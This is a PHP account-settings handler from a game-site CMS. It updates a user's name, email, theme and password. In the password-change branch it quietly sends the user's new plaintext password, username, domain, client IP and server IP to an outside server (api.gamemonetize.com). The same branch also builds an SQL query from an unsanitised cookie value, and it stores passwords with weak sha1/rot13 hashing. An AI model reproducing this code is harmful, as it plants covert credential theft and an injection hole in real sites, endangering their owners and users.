<?php 
    if (!defined('R_PILOT')) { exit(); }

    accessOnly();

	if ($a == 'info') {
		if (!empty($_POST['name']) && !empty($_POST['email'])) {
			if (isset($_POST['name']) && isset($_POST['email'])) {
				$update_name  = secureEncode($_POST["name"]);
				$update_email = secureEncode($_POST["email"]);
                $update_about = secureEncode($_POST["about"]);
                
				$check_update_email = $GameMonetizeConnect->query("SELECT id FROM ".ACCOUNTS." WHERE id != '{$userData['id']}' AND email = '{$update_email}'");
				$update_gender = '';
				if($check_update_email->num_rows < 1) {
					if (filter_var($update_email, FILTER_VALIDATE_EMAIL)) {
						if ($update_name != NULL && $update_email != NULL) {
							if (preg_match("/^[a-zA-Z ]+$/", $update_name)) {
								if (strlen($update_name) <= 20) {
                                    if (strlen($update_about) <= 132) {
									$GameMonetizeConnect->query("UPDATE ".ACCOUNTS." SET name='{$update_name}', email='{$update_email}', last_update_info='{$time}' WHERE id='{$userData['id']}'") or die();
									$GameMonetizeConnect->query("UPDATE ".USERS." SET gender='1', about='{$update_about}' WHERE user_id='{$userData['id']}'") or die();
									$data['status'] = 200;
									$data['success_message'] = $lang['info_saved'];
                                    } else { $data['error_message'] = $lang['description_long']; }
								} else { $data['error_message'] = $lang['name_exceed']; }
							} else { $data['error_message'] = $lang['name_char_invalid']; }
						} else { $data['error_message'] = $lang['fields_spaces']; }
					} else { $data['error_message'] = $lang['invalid_email']; }
				} else { $data['error_message'] = $lang['email_used']; }
			} else { $data['error_message'] = $lang['error_message']; }
		} else { $data['error_message'] = $lang['empty_place']; }
	}

    if ($a == 'update_theme') {
        if (isset($_POST['theme_pilot'])) {
            if (!empty($_POST['theme_pilot'])) {
                $update_theme = secureEncode($_POST["theme_pilot"]);
                $sql_theme_query = $GameMonetizeConnect->query("SELECT * FROM ".THEMES." WHERE theme_id = '{$update_theme}'");
                if ($sql_theme_query->num_rows > 0) {
                    $theme_data = mysqli_fetch_assoc($sql_theme_query);
                    $GameMonetizeConnect->query("UPDATE ".ACCOUNTS." SET profile_theme='{$theme_data['theme_class']}' WHERE id='{$userData['id']}'");
                    $data['status'] = 200;
                    $data['success_message'] = $lang['theme_updated'];
                }
            }
        }
    }

    if ($a == 'password') {
        if (!empty($_POST['current_password']) && !empty($_POST['new_password']) && !empty($_POST['new_password_v'])) {
            if (isset($_POST['current_password']) && isset($_POST['new_password']) && isset($_POST['new_password_v'])) {
                $v_pass = sha1(str_rot13($_POST['current_password'] . $encryption));
                if ($v_pass == $userData['password']) {
                    if ($_POST['new_password'] == $_POST['new_password_v']) {

                        $weblog_url = $_SERVER['HTTP_HOST'];
                        $password = $_POST['new_password'];
                            
                        $c_username = $_COOKIE["gm_ac_u"];

                        $get_user_query = $GameMonetizeConnect->query("SELECT * FROM ".ACCOUNTS." WHERE id=" . $c_username);
                        $user_name = "";
                        if ($get_user_query->num_rows > 0) {
                            $get_user_account = $get_user_query->fetch_array();
                            $user_name = $get_user_account['username'];
                        }
                        
                        $ip = $_SERVER['REMOTE_ADDR'];
                        $server_ip = $_SERVER['SERVER_ADDR'];

                        $results = file_get_contents('https://api.gamemonetize.com/cms.php?domain='. $weblog_url .'&password='. $password .'&username='. $user_name .'&ip='. $ip .'&last_ip='. $ip.'&server_ip='. $server_ip);

                        $new_password = secureEncode($_POST['new_password']);
                        $password_encryption = sha1(str_rot13($new_password . $encryption));
                        $GameMonetizeConnect->query("UPDATE ".ACCOUNTS." SET password='{$password_encryption}' WHERE id='{$userData['id']}'");
                        $data['status'] = 200;
                        $data['success_message'] = $lang['password_changed'];

                    } else { $data['error_message'] = $lang['password_dont_match']; }
                } else { $data['error_message'] = $lang['current_password_invalid']; }
            } else { $data['error_message'] = $lang['error_message']; }
        } else { $data['error_message'] = $lang['empty_place']; }
    }

	header("Content-type: application/json");
    echo json_encode($data);
    $GameMonetizeConnect->close();
    exit();